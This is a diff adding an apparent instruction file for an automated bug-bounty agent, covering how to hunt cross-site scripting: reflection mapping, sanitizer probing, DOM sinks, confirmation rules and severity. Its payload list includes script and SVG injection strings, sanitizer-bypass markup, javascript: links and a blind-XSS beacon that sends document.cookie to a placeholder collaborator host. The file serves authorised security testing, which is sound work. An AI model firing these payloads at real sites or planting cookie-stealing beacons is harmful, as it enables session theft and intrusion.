@@ -1,0 +1,81 @@
+---
+name: hunt-xss
+description: XSS hunting - reflected, stored, DOM-based. Marker discipline to avoid false positives. Blind-XSS beacons for stored contexts. SVG/markdown/redirect vectors. Wiki-first, FIND schema output.
+---
+
+# Hunt: XSS
+
+**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration
+limits, stop conditions, wiki protocol, FIND output, and Deadends. Marker discipline (unique 8+
+char canaries, check the baseline first) lives in hunt-core.
+
+## Wiki
+
+```
+qmd_query "XSS cross-site scripting DOM CSP bypass sanitizer" via wiki-search MCP
+```
+
+Hub: [[web-moc]] (live web index). Primary page: [[xss]]. Payload arsenals: `wiki/payloads/{xss,prototype-pollution}.md`.
+Related client-side vectors: [[dangling-markup]] (scriptless HTML-injection exfil when script tags
+are blocked), [[xssi]] (JSONP/script-inclusion info leak), [[browser-extension-attacks]]
+(content-script/message-passing injection).
+
+## Confirmation gate
+NOT confirmation: payload URL-encoded or HTML-encoded in response, `<script>` appears as `&lt;script&gt;`, ASP.NET validator blocked `<`.
+IS confirmation: HTTP/DNS request to your unique Collaborator subdomain with browser User-Agent (Mozilla/Chrome).
+
+When you plant a blind/stored XSS beacon, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | xss | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique Burp Collaborator / interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind XSS without a HIT row.
+
+## Attack Surface Signals
+High-value: admin panels (`*/admin`, `*/settings`), payment flows, stored wikis/labels/tags, SSO/signin pages, SVG upload endpoints.
+
+DOM XSS signals in JS:
+```javascript
+document.write(  innerHTML =  location.hash  location.search
+eval(  $.html(  $(location  document.referrer
+```
+
+## Methodology
+1. Map all reflection points - URL params, form fields, HTTP headers, file upload names
+2. Classify: Reflected / Stored / DOM
+3. Probe sanitizer: send `aaa"bbb'ccc<ddd` - observe which chars escaped
+4. Test allowlisted tag combos: `<math><style>`, `<svg><style>`, `<iframe srcdoc>`
+5. Hunt SVG upload vectors - often bypasses CSP
+6. Test markdown/RDoc: `[text](javascript:alert(1))`, `link:javascript:`
+7. Check redirect params: `?redirect=javascript:alert(1)`
+8. Test UTM params: `utm_source`, `utm_medium` - often unsanitized on marketing pages
+9. Plant blind-XSS beacons in admin-viewable fields: error messages, User-Agent, Referer, username, email
+10. Validate in real browser before reporting
+11. **Distill when confirmed** (per hunt-core): reusable sanitizer or CSP bypass, GENERIC, `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/xss.md`.
+
+## Key Payloads
+```html
+<!-- Context probe -->
+aaa"bbb'ccc<ddd>eee`fff
+
+<!-- Reflected baseline -->
+"><script>alert(document.domain)</script>
+<svg onload=alert(1)>
+
+<!-- SVG (CSP bypass) -->
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
+
+<!-- Sanitizer bypass -->
+<math><style><img src=x onerror=alert(1)></style></math>
+
+<!-- Blind-XSS beacon -->
+<svg onload=fetch('//bxss-<tag>.<collab>/x?c='+document.cookie)>
+
+<!-- Markdown -->
+[Click](javascript:alert(document.domain))
+```
+
+## Severity
+
+Confirm in a real browser, not just Burp. FIND output and Deadends format per hunt-core:
+
+- **high** - stored in an admin/privileged context, or session theft demonstrated.
+- **medium** - reflected requiring a click.
+- **low** - self-XSS with no chain.
+
+Class deadend line: `- [ ] XSS on <host> <param> -- payload encoded/rejected, [detail]`.
